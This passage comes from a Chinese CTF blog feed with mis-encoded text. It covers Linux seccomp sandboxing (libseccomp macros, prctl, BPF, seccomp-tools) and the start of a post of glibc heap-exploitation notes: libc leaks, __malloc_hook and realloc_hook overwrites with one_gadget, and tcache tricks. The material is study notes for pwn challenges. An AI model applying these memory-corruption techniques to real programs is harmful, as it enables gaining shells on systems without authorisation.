<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for use in declaring rules</span><br><span class="hljs-comment"> * @param arg the argument number, starting at 0</span><br><span class="hljs-comment"> * @param op the comparison operator, e.g. SCMP_CMP_*</span><br><span class="hljs-comment"> * @param datum_a dependent on comparison</span><br><span class="hljs-comment"> * @param datum_b dependent on comparison, optional</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_CMP(...)		((struct scmp_arg_cmp)&#123;__VA_ARGS__&#125;)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A0(...)		SCMP_CMP(0, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A1(...)		SCMP_CMP(1, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A2(...)		SCMP_CMP(2, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A3(...)		SCMP_CMP(3, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A4(...)		SCMP_CMP(4, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 5</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A5(...)		SCMP_CMP(5, __VA_ARGS__)</span><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Comparison operators</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> &#123;</span><br>	_SCMP_CMP_MIN = <span class="hljs-number">0</span>,<br>	SCMP_CMP_NE = <span class="hljs-number">1</span>,		<span class="hljs-comment">/**&lt; not equal */</span><br>	SCMP_CMP_LT = <span class="hljs-number">2</span>,		<span class="hljs-comment">/**&lt; less than */</span><br>	SCMP_CMP_LE = <span class="hljs-number">3</span>,		<span class="hljs-comment">/**&lt; less than or equal */</span><br>	SCMP_CMP_EQ = <span class="hljs-number">4</span>,		<span class="hljs-comment">/**&lt; equal */</span><br>	SCMP_CMP_GE = <span class="hljs-number">5</span>,		<span class="hljs-comment">/**&lt; greater than or equal */</span><br>	SCMP_CMP_GT = <span class="hljs-number">6</span>,		<span class="hljs-comment">/**&lt; greater than */</span><br>	SCMP_CMP_MASKED_EQ = <span class="hljs-number">7</span>,		<span class="hljs-comment">/**&lt; masked equality */</span><br>	_SCMP_CMP_MAX,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument datum</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-keyword">scmp_datum_t</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument / Value comparison definition</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scmp_arg_cmp</span> &#123;</span><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> arg;	<span class="hljs-comment">/**&lt; argument number, starting at 0 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> <span class="hljs-title">op</span>;</span>	<span class="hljs-comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span><br>	<span class="hljs-keyword">scmp_datum_t</span> datum_a;<br>	<span class="hljs-keyword">scmp_datum_t</span> datum_b;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>	scmp_filter_ctx ctx;<br>	ctx = <span class="hljs-built_in">seccomp_init</span>(SCMP_ACT_ALLOW);<br>	<span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL,         <span class="hljs-built_in">SCMP_SYS</span>(write),<span class="hljs-number">1</span>,<span class="hljs-built_in">SCMP_A2</span>(SCMP_CMP_EQ,<span class="hljs-number">0x10</span>));<span class="hljs-comment">//ç¬¬2(ä»0)ä¸ªå‚æ•°ç­‰äº0x10</span><br>	<span class="hljs-built_in">seccomp_load</span>(ctx);<br>	<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<span class="hljs-comment">//ä¸è¢«æ‹¦æˆª</span><br>	<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>,<span class="hljs-number">0x10</span>);<span class="hljs-comment">//è¢«æ‹¦æˆª</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="prctl-å‡½æ•°"><a href="#prctl-å‡½æ•°" class="headerlink" title="prctl å‡½æ•°"></a>prctl å‡½æ•°</h2><p>æŸ¥çœ‹å‡½æ•°åŸå‹ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŒ‡å®šç›¸åº”çš„æ“ä½œï¼Œåœ¨æ‰‹å†Œä¸Šæœ‰ç‰¹åˆ«å¤šçš„é€‰é¡¹ï¼Œè¿™é‡Œæ‰“ç®—ä»‹ç»ä¸¤ä¸ªã€‚</p>
<h3 id="PR-SET-NO-NEW-PRIVS-ç”¨38è¡¨ç¤º"><a href="#PR-SET-NO-NEW-PRIVS-ç”¨38è¡¨ç¤º" class="headerlink" title="PR_SET_NO_NEW_PRIVS(ç”¨38è¡¨ç¤º)"></a>PR_SET_NO_NEW_PRIVS(ç”¨38è¡¨ç¤º)</h3><p>ç®€å•çš„è¯´å°±æ˜¯å¦‚æœ option è®¾ç½®ä¸º <code>PR_SET_NO_NEW_PRIVS</code> çš„è¯ï¼Œç¬¬äºŒä¸ªå‚æ•°å¦‚æœè®¾ç½®ä¸º 1 çš„è¯ï¼Œ<strong>ä¸èƒ½å¤Ÿè¿›è¡Œ execve çš„ç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ—¶è¿™ä¸ªé€‰é¡¹è¿˜ä¼šç»§æ‰¿ç»™å­è¿›ç¨‹</strong>ã€‚</p>
<p>è¿™æ ·çš„è¯å¸¸è§„çš„è°ƒç”¨ system å‡½æ•°ã€one_gadget çš„ç”¨ä¸äº†äº†ï¼Œè¿™é‡Œçš„è®¾ç½®ç‚¹å…¶å®å’Œ <strong>pwnable.tw ä¸Š orw é‚£é“é¢˜ä¸€æ ·ï¼Œåªèƒ½è¿›è¡Œå‡ ä¸ªç³»ç»Ÿè°ƒç”¨ï¼šopenã€writeã€read</strong>ã€‚</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png" alt="img"></a></strong></p>
<p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œå½“prctlçš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸º38æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º1æ—¶ï¼Œå˜ä¼šè§¦å‘ä¸Šè¿°æ•ˆæœã€‚</p>
<h3 id="PR-SET-SECCOMPï¼ˆç”¨22è¡¨ç¤ºï¼‰"><a href="#PR-SET-SECCOMPï¼ˆç”¨22è¡¨ç¤ºï¼‰" class="headerlink" title="PR_SET_SECCOMPï¼ˆç”¨22è¡¨ç¤ºï¼‰"></a>PR_SET_SECCOMPï¼ˆç”¨22è¡¨ç¤ºï¼‰</h3><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¯ä»¥å‚è§manæ‰‹å†Œé‡Œé¢çš„ä»‹ç»</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png" alt="img"></a></strong></p>
<p>è®¾ç½® seccomp ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è®¾ç½®æ²™ç®±è§„åˆ™ï¼Œè¿™ä¸ª option æœ‰ä¸¤ä¸ªå­å‚æ•°ï¼š</p>
<ul>
<li><p>è¿™é‡Œå¦‚æœè®¾ç½®äº† <code>SECCOMP_MODE_STRICT</code> ï¼ˆç”¨1è¡¨ç¤ºï¼‰æ¨¡å¼çš„è¯ï¼Œç³»ç»Ÿè°ƒç”¨åªèƒ½ä½¿ç”¨ read, write,_exit è¿™ä¸‰ä¸ªã€‚</p>
</li>
<li><p>å¦‚æœè®¾ç½®äº† <code>SECCOMP_MODE_FILTER</code> ï¼ˆç”¨2è¡¨ç¤ºï¼‰çš„è¯ï¼Œç³»ç»Ÿè°ƒç”¨è§„åˆ™å°±å¯ä»¥è¢« Berkeley Packet Filterï¼ˆBPFï¼‰ çš„è§„åˆ™æ‰€å®šä¹‰ï¼Œè¿™ç©æ„å°±æ˜¯è¿™é‡Œæœ€æœ€é‡ç‚¹çš„ä¸œè¥¿äº†ã€‚</p>
<p>é¦–å…ˆä»‹ç»ä¸€ä¸‹è¿™ä¸ªBPFæ˜¯å•¥å§ï¼Œåº¦å¨˜ä¸Šé¢çš„è§£é‡Šæ˜¯ï¼š</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png" alt="img"></a></strong></p>
</li>
</ul>
<p>çœ‹è§£é‡Šæ„Ÿè§‰æ˜¯ç½‘ç»œæ•°æ®åŒ…ä¼ è¾“è¿‡æ»¤çš„ä¸€ç§è§„åˆ™ï¼Œä½†äº‹å®ä¸Šï¼Œåé¢å·²ç»è¢«å¼•ç”¨ä¸ºæ²™ç®±è§„åˆ™</p>
<blockquote>
<p>BPF å®šä¹‰äº†ä¸€ä¸ªä¼ªæœºå™¨ã€‚è¿™ä¸ªä¼ªæœºå™¨å¯ä»¥æ‰§è¡Œä»£ç ï¼Œæœ‰ä¸€ä¸ªç´¯åŠ å™¨ï¼Œå¯„å­˜å™¨ï¼Œå’Œèµ‹å€¼ã€ç®—æœ¯ã€è·³è½¬æŒ‡ä»¤ã€‚ä¸€æ¡æŒ‡ä»¤ç”±ä¸€ä¸ªå®šä¹‰å¥½çš„ç»“æ„ struct bpf_insn è¡¨ç¤ºï¼Œä¸çœŸæ­£çš„æœºå™¨ä»£ç å¾ˆç›¸ä¼¼ï¼Œè‹¥å¹²ä¸ªè¿™æ ·çš„ç»“æ„ç»„æˆçš„æ•°ç»„ï¼Œå°±æˆä¸º BPF çš„æŒ‡ä»¤åºåˆ—ã€‚</p>
</blockquote>
<p>æ€»ç»“ä¸€äº›ç‚¹ï¼š</p>
<ol>
<li><p><strong>ç»“æ„èµ‹å€¼æ“ä½œæŒ‡ä»¤ä¸º</strong>ï¼šBPF_STMTã€BPF_JUMP ï¼Œä¸¤ä¸ªå®å±•å¼€éƒ½æ˜¯å·²ç»èµ‹å€¼çš„äº†struct bpf_insnç»“æ„ã€‚</p>
</li>
<li><p><strong>BPF çš„ä¸»è¦æŒ‡ä»¤æœ‰</strong> BPF_LDï¼ŒBPF_ALUï¼ŒBPF_JMPï¼ŒBPF_RET ç­‰ã€‚BPF_LD å°†æ•°æ®è£…å…¥ç´¯åŠ å™¨ï¼ŒBPF_ALU å¯¹ç´¯åŠ å™¨æ‰§è¡Œç®—æœ¯å‘½ä»¤ï¼ŒBPF_JMP æ˜¯è·³è½¬æŒ‡ä»¤ï¼ŒBPF_RET æ˜¯ç¨‹åºè¿”å›æŒ‡ä»¤</p>
</li>
<li><p><strong>BPF æ¡ä»¶åˆ¤æ–­è·³è½¬æŒ‡ä»¤</strong>ï¼šBPF_JMPã€BPF_JEQï¼ŒBPF_JA,BPF_JGTç­‰ï¼Œè¯­æ³•è·Ÿæ±‡ç¼–è¯­è¨€å‡ ä¹ç›¸ç­‰ï¼Œæ ¹æ®åé¢çš„å‡ ä¸ªå‚æ•°è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åè·³è½¬åˆ°ç›¸åº”çš„åœ°æ–¹ã€‚</p>
</li>
<li><p><strong>è¿”å›æŒ‡ä»¤</strong>ï¼šBPF_RETã€BPF_Kï¼Œè¿”å›åé¢å‚æ•°çš„å€¼</p>
</li>
<li><p><strong>ä¸€äº›æ‚ç”¨æŒ‡ä»¤</strong>ï¼šBPF_Hè¡¨ç¤ºæŒ‰å­—ä¼ è¾“ï¼ŒBPF_Wè¡¨ç¤ºæŒ‰åŒå­—ä¼ è¾“ï¼ŒBPF_Bè¡¨ç¤ºæŒ‰å•ä¸ªå­—èŠ‚ä¼ è¾“ï¼›BPF_ABSè¡¨ç¤ºç»å¯¹åç§»ï¼ŒBPF_INDè¡¨ç¤ºç›¸å¯¹åç§»ï¼Œ <code>SECCOMP_RET_ALLOW</code> è¡¨ç¤ºå…è®¸ï¼Œ <code>SECCOMP_RET_ERRNO</code> è¡¨ç¤ºç¦æ­¢ã€‚</p>
<p>è¿™ä¸ªå…¶å®èƒŒåä¹Ÿç‰µæ¶‰åˆ°å¾ˆå¤šå†…å®¹ï¼Œå‚è§ä»¥ä¸‹ä¸¤ç¯‡æ–‡ç« çš„ä»‹ç»ã€‚</p>
<p><a href="http://www.360doc.com/content/06/1026/17/13362_241408.shtml">http://www.360doc.com/content/06/1026/17/13362_241408.shtml</a></p>
</li>
</ol>
<p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<h2 id="seccomp-tools-å·¥å…·"><a href="#seccomp-tools-å·¥å…·" class="headerlink" title="seccomp-tools å·¥å…·"></a>seccomp-tools å·¥å…·</h2><p>ä»¥ä¸Šè®¾ç½®åœ¨pwné¢˜ä¸­é‡åˆ°æ—¶ä¸€èˆ¬éƒ½æ˜¯ç¦æ­¢äº†ä¸€äº›ç³»ç»Ÿè°ƒç”¨ã€‚æ•…å¯ä»¥<strong>seccomp-tools</strong>è¿™ä¸ªå·¥å…·å»æŸ¥çœ‹ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<ul>
<li><p>å®‰è£…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc ruby-dev</span><br><span class="hljs-meta">$</span><span class="bash"> gem install seccomp-tools</span><br></code></pre></td></tr></table></figure></li>
<li><p>ä½¿ç”¨ï¼šä¸€èˆ¬ç”¨åˆ°dumpè¿™ä¸ªç”¨æ³•ï¼Œå…¶ä»–è¯¦ç»†ç”¨æ³•å¯è§ä¸Šé¢githubã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
]]></content>
      <tags>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>å †äºŒä¸‰äº‹</title>
    <url>/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="ä¸€äº›å…³äºå †çš„å°çŸ¥è¯†ç‚¹"><a href="#ä¸€äº›å…³äºå †çš„å°çŸ¥è¯†ç‚¹" class="headerlink" title="ä¸€äº›å…³äºå †çš„å°çŸ¥è¯†ç‚¹"></a>ä¸€äº›å…³äºå †çš„å°çŸ¥è¯†ç‚¹</h1><p>ï¼ˆæ²¡æœ‰é¡ºåºï¼ŒçŸ¥è¯†ç‚¹æ˜¯é›¶æ•£çš„ï¼Œéƒ½æ˜¯æˆ‘è‡ªå·±å­¦åˆ°ä¸€ç‚¹ï¼Œè®°å½•ä¸‹ä¸€ç‚¹ï¼‰</p>
<p>1ã€å½“small chunkåªæœ‰ä¸€ä¸ªæ—¶ï¼Œå¦‚æœè¢«é‡Šæ”¾äº†ï¼Œä¼šè¢«åˆ’åˆ†åˆ°unsorted biné‡Œé¢ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªæ—¶ï¼Œè¯¥chunkçš„fdå’Œbkéƒ½æŒ‡å‘libcä¸­çš„åœ°å€ï¼Œå¯ä»¥å€Ÿæ¬¡æ³„éœ²libcåœ°å€</p>
<p>2ã€å½“å…ˆè°ƒç”¨äº†mmapå‡½æ•°æ—¶ï¼Œmallocç³»åˆ—å‡½æ•°ç”³è¯·çš„chunkçš„åœ°å€æ˜¯ä»heapçš„èµ·å§‹åœ°å€å¼€å§‹åˆ†é…çš„ï¼Œåˆæœ‰é¡µï¼ˆ4KBï¼‰æ˜¯å†…å­˜åˆ†é…çš„æœ€å°å•ä½ï¼Œå¯¼è‡´heapåœ°å€çš„æœ€ä½ä¸‰ä½æ€»æ˜¯0x000ã€‚å› æ­¤ç”³è¯·çš„chunkå¯ä»¥åªè¦è¦†ç›–åœ°å€æœ€ä½ä¸¤ä½è¿›è¡Œä¿®æ”¹å…¶fdå’Œbkçš„å€¼</p>
<p>3ã€åœ¨åˆ©ç”¨malloc_hookï¼ˆ__malloc_hookæ˜¯ä¸€ä¸ªå¼±ç±»å‹çš„å‡½æ•°æŒ‡é’ˆå˜é‡ï¼ŒæŒ‡å‘void * function(size_t size void * caller)ï¼Œå½“è°ƒç”¨mallocç³»åˆ—å‡½æ•°æ—¶ï¼Œä¼šåˆ¤æ–­hookæŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™è°ƒç”¨å®ƒï¼‰å‡½æ•°æ—¶ï¼Œè¦ä½¿ç”¨é”™ä½åç§»ï¼Œå³ä¸ºæŠŠ<strong>hookå‡½æ•°åœ°å€-0x23ï¼ˆæœ‰æ—¶å€™ä¹Ÿå¯ä»¥æ‰¾æ‰¾hookåœ°å€-0x20+0x5ï¼‰</strong>ã€‚æ­¤æ—¶ï¼Œåœ¨å†™ä¸Šp8(0)*3+p64(one_gadget)å³å¯è·å–shellï¼ˆä¼¼ä¹æœ‰äº›ä¸å‡†ç¡®ï¼Œè™½ç„¶æœ‰çš„ç¡®å®è¡Œçš„é€šï¼Œä½†æ˜¯æ›´å…¨é¢çš„åº”è¯¥æ˜¯æ£€éªŒçš„sizeä½ç½®æ˜¯intç±»å‹çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥æŸ¥çœ‹ä½32ä½çš„æ•°ï¼Œæ‰€ä»¥ä¸å±€é™-0x20ï¼Œå¯èƒ½æ˜¯0x30ï¼Œ0x38ç­‰ç­‰ï¼Œåœ¨gdbé‡Œé¢è°ƒè¯•å‘ç°å³å¯ï¼‰</p>
<p>4ã€å¦‚æœé‡Šæ”¾ä¸¤ä¸ªfast chunkè¿›å…¥fast binä¸­ï¼Œå¦‚æœæœ‰UAFæ¼æ´ï¼Œä¿®æ”¹åè¿›çš„å †å—fdæŒ‡é’ˆæŒ‡å‘å…¶ä»–çš„åŒæ ·å¤§å°çš„fast chunkï¼Œé‚£ä¹ˆè¢«æŒ‡å‘çš„å †å—ä¼šè¢«è®¤ä¸ºæ˜¯åœ¨fast binä¸­çš„ï¼Œè€Œè¿™æ—¶å€™å¦‚æœè¿™ä¸ªchunkçš„fdä¸Šæœ‰åœ°å€æ•°æ®ï¼Œå°±å¯ä»¥ç”³è¯·åˆ°é‚£è¾¹å»ï¼ˆé€‚ç”¨äºè¦å€Ÿç”¨unsorted chunkä¸Šçš„è„æ•°æ®ï¼Œè¦†ç›–ä½å­—èŠ‚åœ°å€ï¼‰</p>
<p>5ã€chunkçš„sizeå­—æ®µçš„æœ€æœ«ä½çš„ä¸‰ä¸ªæ¯”ç‰¹ä½è¢«ç”¨ä½œçŠ¶æ€æ ‡è¯†ï¼Œæ‰€ä»¥ï¼Œsizeå­—æ®µçš„ä»¥16è¿›åˆ¶è¡¨ç¤ºæ—¶ï¼Œæœ€åä¸€ä½16è¿›åˆ¶æ•°æ˜¯ä¸èƒ½ç®—åˆ°sizeé‡Œé¢çš„</p>
<p>6ã€ä¸€ä¸ªchunkçš„å¤§å°æœ€å°æ˜¯0x20(32å­—èŠ‚64ä½ç³»ç»Ÿä¸‹)ï¼Œæˆ–è€…0x10(16å­—èŠ‚32ä½ç³»ç»Ÿä¸‹)</p>
<p>7ã€åœ¨Glibc2.26ä¹‹åçš„ç‰ˆæœ¬å‡ºç°äº†Tcacheæœºåˆ¶ï¼Œåœ¨64ä½æƒ…å†µä¸‹ï¼Œtcacheä¼˜å…ˆäºå…¶ä»–biné“¾æ¥æ”¶é‡Šæ”¾æ‰çš„0Ã—20<del>0Ã—400å¤§å°çš„å †å—ï¼ˆ32ä½ä¸‹0xC</del>0x200ï¼‰ï¼Œtcacheæœ€å¤šå¯ä»¥æ¥æ”¶7ä¸ªchunkï¼Œå¤šå‡ºçš„éƒ¨åˆ†å°†æŒ‰ç…§åŸæ¥Glibcç‰ˆæœ¬é‡Œé¢çš„æ–¹å¼åˆ†é…ã€‚</p>
<p>å¹¶ä¸”ä»tcacheåˆ†é…å‡ºå»çš„chunkå¹¶ä¸ä¼šæ£€æŸ¥è¢«åˆ†é…ä½ç½®çš„sizeå¤§å°ï¼Œä¹Ÿå°±æ˜¯ä¸å¿…åƒä¹‹å‰çš„ç‰ˆæœ¬ä½¿ç”¨é”™ä½åç§»æ¥ä½¿sizeç¬¦åˆæ£€æŸ¥</p>
<p>åˆ©ç”¨Tcacheæ³„éœ²libcæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š</p>
<ul>
<li>ç”³è¯·8ä¸ªå¤§å †å—ï¼Œé‡Šæ”¾8ä¸ªï¼Œè¿™é‡Œå †å—å¤§å°ï¼Œå¤§äºfastbinèŒƒå›´ï¼Œå°±æ˜¯å¡«æ»¡tcacheï¼Œè®©ç¬¬å…«ä¸ªè¿›å…¥unsorted binä¸­</li>
<li>æœ‰UAFçš„æƒ…å†µä¸‹ï¼Œè¿ç»­free 8æ¬¡åŒä¸€ä¸ªå †å—ï¼Œè¿™é‡Œå †å—å¤§å°ï¼Œå¤§äºfastbinèŒƒå›´</li>
<li>ç”³è¯·å¤§å †å—ï¼Œå¤§äº0Ã—400</li>
<li>ä¿®æ”¹å †ä¸Šçš„Tcacheç®¡ç†ç»“æ„ï¼ŒæŠŠcountå€¼æ”¹ä¸º7ï¼ˆcountçš„å€¼æ˜¯æœ‰è§„å¾‹çš„ï¼Œåœ¨Tcacheé‡Œé¢ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚å­˜æ”¾çš„æ˜¯0x20å¤§å°çš„å †å—ä¸ªæ•°ï¼Œæ¯éš”ä¸€ä¸ªå­—èŠ‚ï¼Œå †å—å¤§å°å¢åŠ 0x10ï¼Œå‰0x40éƒ½æ˜¯å­˜æ”¾ä¸ªæ•°ï¼Œåé¢çš„å†…å®¹å­˜æ”¾å †å—åœ°å€ï¼‰ï¼Œç„¶åå†æ¬¡freeä¸€ä¸ªè¯¥å¤§å°çš„chunkï¼Œæ³¨æ„é˜²æ­¢chunkè¢«top chunkåˆå¹¶</li>
</ul>
<p>ä»¥ä¸Šéƒ½å¯ä»¥è®©chunkçš„fdå’ŒbkæŒ‡é’ˆæŒ‡å‘libcçš„æŸä¸ªä½ç½®è€Œæ³„éœ²åœ°å€</p>
<p>8ã€å½“ä¿®æ”¹hookå‡½æ•°ä¸ºone_gadgetå‘ç°æ‰€æœ‰ç»™çš„execveéƒ½ä¸è¡Œæ—¶ï¼Œè¿™æ—¶éœ€è¦æˆ‘ä»¬å€Ÿç”¨__libc_reallocå»è°ƒæ•´æ ˆçš„å‚æ•°ï¼Œä½¿execveçš„ç¯å¢ƒè¢«æ»¡è¶³æ‰å¯ä»¥åˆ©ç”¨æˆåŠŸã€‚__realloc_hookçš„åœ°å€æ˜¯__malloc_hook-0x8ã€‚å› ä¸ºè°ƒç”¨reallocä¼šæ‰§è¡Œè®¸å¤šçš„pushæŒ‡ä»¤ï¼Œå¯ä»¥æŠŠrspè°ƒæ•´åˆ°æ»¡è¶³ç¯å¢ƒã€‚è¦æŸ¥çœ‹pushæ“ä½œï¼Œå¯ä»¥æŠŠ__libc_reallocåœ°å€åŠ ä¸Šnï¼ŒæŒ‡å‘çš„éƒ½æ˜¯pushæŒ‡ä»¤</p>
<p>æ“ä½œï¼šæŠŠone_gadgetå†™åˆ°__relloc_hookåœ°å€ä¸Šï¼Œå› ä¸ºåœ¨ä½¿ç”¨mallocå‡½æ•°åé¢ä¼šè°ƒç”¨åˆ°__relloc_hookï¼›åœ¨__malloc_hookåœ°å€å†™ä¸Š__libc_realloc+n(å°±ä¼šå…ˆæ‰§è¡Œ__libc_realloc+nè°ƒæ•´ï¼Œå†æ‰§è¡Œone_gadget)</p>
<p>æ³¨ï¼šæ ¹æ®libcç‰ˆæœ¬é—®é¢˜ï¼Œä¸ä¸€å®šéƒ½æ˜¯__libc_realloc ï¼Œä¹Ÿå¯ä»¥æ˜¯realloc</p>
<p>9ã€å †é¢˜libcéƒ½å¾ˆé‡è¦,é¢˜ç›®æ²¡ç»™libcï¼Œå¦‚æœå­˜åœ¨double freeï¼Œå¯ä»¥ç”¨å…¶æµ‹è¯•libcç‰ˆæœ¬</p>
<ul>
<li>å¦‚æœæŠ¥fastbin double free é‚£å°±æ˜¯2.23~2.26<ul>
<li>2.23ä¸‹ä¼šæ£€æŸ¥freeçš„fastbin chunkæ˜¯ä¸æ˜¯fastbiné“¾è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªchunk</li>
</ul>
</li>
<li>å¦‚æœæ²¡æŠ¥é”™é‚£å°±æ˜¯2.27~2.28<ul>
<li>å› ä¸ºæœ‰tcahce,2.27çš„tcacheæ²¡æœ‰ä»»ä½•æ£€æŸ¥</li>
</ul>
</li>
<li>å¦‚æœæŠ¥tcache double freeé‚£ä¹ˆå°±æ˜¯2.29åŠå…¶ä»¥ä¸Š<ul>
<li>å› ä¸º2.29ä»¥åtcacheå¢åŠ äº†keyå­—æ®µé˜²æ­¢tcache double free</li>
</ul>
</li>
</ul>
<p>10ã€chunkçš„ä¸‰ä¸ªæ ‡å¿—ä½ï¼šä»é«˜åˆ°ä½ä¾æ¬¡è¡¨ç¤ºä¸ºï¼šnon_main_arenaã€is_mmapã€prev_inuse</p>
<p>non_main_arenaï¼š0è¡¨ç¤ºå½“å‰chunkæ˜¯å±äºmain_arenaï¼Œ1è¡¨ç¤ºä¸å±äº</p>
